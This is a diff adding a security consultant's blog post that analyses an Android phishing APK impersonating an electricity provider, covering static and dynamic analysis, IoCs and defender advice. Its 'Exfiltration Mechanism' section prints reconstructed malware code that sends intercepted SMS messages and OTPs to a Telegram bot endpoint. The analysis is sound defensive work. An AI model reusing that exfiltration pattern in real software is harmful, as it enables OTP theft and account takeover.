@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Anatomy of an Android Phishing APK Targeting Utility Users — Abbytes</title>
+  <meta name="description" content="A forensic breakdown of an Android phishing APK impersonating an electricity provider — infrastructure mapping, exfiltration mechanics, and defensive takeaways for blue teams." />
+  <meta name="keywords" content="Android phishing APK forensics, mobile malware analysis, APK reverse engineering, MobSF, CERT-IN, utility phishing India, Android forensics" />
+  <meta name="author" content="Mohd Abdullah Khan — Abbytes" />
+  <link rel="canonical" href="https://abbytes.in/blog/android-phishing-forensics.html" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="Anatomy of an Android Phishing APK Targeting Utility Users" />
+  <meta property="og:description" content="Forensic breakdown of Android phishing malware — infrastructure mapping, exfiltration mechanics, and defensive takeaways." />
+  <meta property="og:url" content="https://abbytes.in/blog/android-phishing-forensics.html" />
+  <meta property="og:image" content="https://abbytes.in/og-image.png" />
+  <link rel="icon" type="image/svg+xml" href="../favicon.svg" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" /><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,300&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <header class="nav-wrap scrolled">
+    <nav class="nav container">
+      <a href="../index.html" class="logo"><svg width="22" height="22" viewBox="0 0 32 32" fill="none"><polygon points="16,2 30,9 30,23 16,30 2,23 2,9" fill="none" stroke="#16a34a" stroke-width="2.5"/></svg><span class="logo-text">Abbytes</span></a>
+      <ul class="nav-links">
+        <li><a href="../index.html#services">Services</a></li><li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#projects">Projects</a></li><li><a href="../index.html#blog">Blog</a></li>
+        <li><a href="../index.html#contact" class="nav-cta">Hire Me</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main style="padding-top:64px;">
+    <div class="post-wrap">
+      <a href="./index.html" class="post-back"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5"/><polyline points="12 19 5 12 12 5"/></svg>All Posts</a>
+
+      <div class="post-header">
+        <span class="post-tag">Forensics</span>
+        <h1 class="post-title">Anatomy of an Android Phishing APK Targeting Utility Users</h1>
+        <div class="post-meta">
+          <span>Mohd Abdullah Khan</span><span>·</span>
+          <time datetime="2025-02-01">February 2025</time><span>·</span><span>10 min read</span>
+        </div>
+      </div>
+
+      <div class="post-hero-img blog-img--red">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#ea580c" stroke-width="1" opacity="0.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+      </div>
+
+      <article class="post-content">
+        <p>Phishing campaigns targeting electricity and utility customers have become increasingly common in India. In this case, the malicious APK was distributed via WhatsApp messages claiming to be an official app update for a major electricity provider. Users were prompted to install the app to "avoid disconnection" — a classic urgency hook that bypasses rational scrutiny.</p>
+
+        <p>This writeup documents the forensic analysis methodology I used, the attacker's infrastructure, and what defenders can do to protect their users.</p>
+
+        <blockquote>Specifics of the targeted organization and victims have been redacted. This analysis was conducted under an authorized incident response engagement and formally reported to the relevant CERT-IN nodal officer.</blockquote>
+
+        <h2>Initial Triage — APK Metadata</h2>
+
+        <p>The sample was received as <code>electricity_app_update.apk</code> (MD5 redacted). The first step is always static metadata extraction — don't install or execute the sample until you understand what you're dealing with.</p>
+
+        <pre><code># Extract APK metadata
+apktool d electricity_app_update.apk -o decompiled/
+
+# Key files to examine immediately:
+# AndroidManifest.xml   — permissions, components, intent filters
+# res/values/strings.xml — hardcoded strings (URLs, keys, messages)
+# classes.dex            — compiled Dalvik bytecode</code></pre>
+
+        <p>The <code>AndroidManifest.xml</code> immediately raised red flags — a utility billing app has no legitimate need for these permissions:</p>
+
+        <pre><code>&lt;uses-permission android:name="android.permission.READ_SMS" /&gt;
+&lt;uses-permission android:name="android.permission.RECEIVE_SMS" /&gt;
+&lt;uses-permission android:name="android.permission.READ_CONTACTS" /&gt;
+&lt;uses-permission android:name="android.permission.CAMERA" /&gt;
+&lt;uses-permission android:name="android.permission.RECORD_AUDIO" /&gt;
+&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt;</code></pre>
+
+        <p>SMS read/receive permissions are the most critical indicator here — this tells us the malware is likely targeting OTP interception for financial fraud.</p>
+
+        <h2>Static Analysis with MobSF</h2>
+
+        <p>Mobile Security Framework (MobSF) provides automated static analysis with a clean HTML report. Run it against the APK for a quick triage overview before diving into manual analysis:</p>
+
+        <pre><code>docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
+# Upload APK via http://localhost:8000
+# Review: Security Score, Permissions, Hardcoded Secrets, Network Traffic</code></pre>
+
+        <p>MobSF flagged several hardcoded URLs in the decompiled <code>strings.xml</code>. One stood out — a Telegram Bot API URL used for data exfiltration. This is a common C2 pattern for low-sophistication threat actors: Telegram provides free, reliable, hard-to-block message delivery with no server infrastructure to maintain.</p>
+
+        <h2>Exfiltration Mechanism</h2>
+
+        <p>Decompiling the <code>classes.dex</code> with <strong>jadx</strong> revealed the exfiltration logic clearly:</p>
+
+        <pre><code>// Reconstructed from decompiled Dalvik bytecode
+private void exfiltrateData(String smsContent, String contactData) {
+    String botToken = "redacted";
+    String chatId   = "redacted";
+    String message  = "VICTIM: " + deviceInfo + "\nSMS: " + smsContent;
+
+    String url = "https://api.telegram.org/bot" + botToken
+               + "/sendMessage?chat_id=" + chatId
+               + "&text=" + URLEncoder.encode(message, "UTF-8");
+
+    // Fire-and-forget HTTP GET — no error handling
+    new AsyncTask&lt;Void, Void, Void&gt;() {
+        protected Void doInBackground(Void... v) {
+            new URL(url).openStream(); // Primitive but effective
+            return null;
+        }
+    }.execute();
+}</code></pre>
+
+        <p>The exfiltration fired on three events: SMS received, app foreground, and every 15 minutes via <code>AlarmManager</code>. This gave the attacker near real-time visibility into OTPs sent to the victim's device — enabling account takeover of banking and payment apps.</p>
+
+        <h2>Infrastructure Mapping</h2>
+
+        <p>Beyond the Telegram bot, the APK made calls to a secondary C2 endpoint for updated configuration. OSINT on the hosting IP revealed:</p>
+
+        <ul>
+          <li>The server was hosted on a popular Indian cloud provider, registered with a throwaway email address 3 days before the campaign</li>
+          <li>The domain used a typosquatted variation of the legitimate utility brand name</li>
+          <li>The SSL certificate was a free Let's Encrypt cert (issued 2 days before campaign launch) — this is why domain-validation certificates alone offer no trust signal</li>
+          <li>The same IP hosted two other phishing pages targeting a different utility brand, suggesting a small-scale but organised threat actor running parallel campaigns</li>
+        </ul>
+
+        <h2>Behavioural Analysis — Dynamic Confirmation</h2>
+
+        <p>To confirm the static findings, I ran the APK in a <strong>Genymotion</strong> isolated emulator with network traffic routed through Burp Suite:</p>
+
+        <pre><code># Network setup for dynamic analysis
+adb reverse tcp:8080 tcp:8080  # Forward traffic to Burp on host
+# Configure emulator proxy: 127.0.0.1:8080
+
+# Monitor system calls and file access
+adb shell strace -p $(adb shell pidof com.fake.electricity) 2>&1 | tee strace_log.txt
+
+# Monitor file creation (data staging before exfil)
+adb shell inotifywait -m /data/data/com.fake.electricity/</code></pre>
+
+        <p>Dynamic analysis confirmed that SMS content was being staged in a SQLite database at <code>/data/data/com.fake.electricity/databases/sms_cache.db</code> before batch-exfiltrating every 15 minutes. This caching behaviour explained why some victims reported the malware working even when the device was briefly offline.</p>
+
+        <h2>Indicators of Compromise (IoCs)</h2>
+
+        <p>Key IoCs identified during this investigation (generalised to protect ongoing investigation):</p>
+
+        <ul>
+          <li>APK requests SMS + CAMERA + AUDIO permissions immediately on first launch</li>
+          <li>Outbound connections to <code>api.telegram.org</code> from a utility billing app</li>
+          <li>Persistent <code>AlarmManager</code> service running every 15 minutes in background</li>
+          <li>SQLite database named <code>sms_cache.db</code> in the app's private data directory</li>
+          <li>App icon mimics official utility brand with minor visual differences</li>
+        </ul>
+
+        <h2>Recommendations for Defenders</h2>
+
+        <p>For utility companies and organisations at risk of brand impersonation:</p>
+
+        <ul>
+          <li><strong>Publish a clear app distribution policy:</strong> Make it prominently visible on your website that your official app is only available via Google Play / App Store — never distributed via WhatsApp or SMS links.</li>
+          <li><strong>Enroll in Google Play Protect Partner:</strong> Allows you to work with Google to identify and flag impersonating apps in the Play ecosystem.</li>
+          <li><strong>Monitor typosquatted domains:</strong> Use brand monitoring tools or DMARC reporting to detect domains impersonating your brand before they're weaponised.</li>
+          <li><strong>Customer awareness campaigns:</strong> A brief SMS or bill insert — "We will never ask you to install an app via WhatsApp" — can significantly reduce successful installs.</li>
+        </ul>
+
+        <h2>Formal Reporting</h2>
+
+        <p>The full findings — including all IoCs, attacker infrastructure details, APK hashes, and timeline — were documented in a formal incident report and submitted to the relevant CERT-IN nodal officer. The Telegram bot token was also reported directly to Telegram's abuse team, which resulted in the bot being suspended within 48 hours.</p>
+
+        <p>If you suspect your organisation is being impersonated in a similar campaign, reach out at <a href="mailto:contact@abbytes.in">contact@abbytes.in</a> for an initial consultation.</p>
+      </article>
+
+      <div class="post-footer">
+        <div class="post-author">
+          <div class="author-avatar">MAK</div>
+          <div><div class="author-name">Mohd Abdullah Khan</div><div class="author-title">Information Security Consultant · Abbytes</div></div>
+        </div>
+        <a href="../index.html#contact" class="btn btn-primary">Discuss an Engagement</a>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer-inner">
+      <a href="../index.html" class="logo"><svg width="20" height="20" viewBox="0 0 32 32" fill="none"><polygon points="16,2 30,9 30,23 16,30 2,23 2,9" fill="none" stroke="#16a34a" stroke-width="2.5"/></svg><span class="logo-text">Abbytes</span></a>
+      <p class="footer-copy">© 2025 Abbytes. All rights reserved.</p>
+      <div class="footer-links"><a href="../index.html#services">Services</a><a href="./index.html">Blog</a><a href="../index.html#contact">Contact</a></div>
+    </div>
+  </footer>
+</body>
+</html>
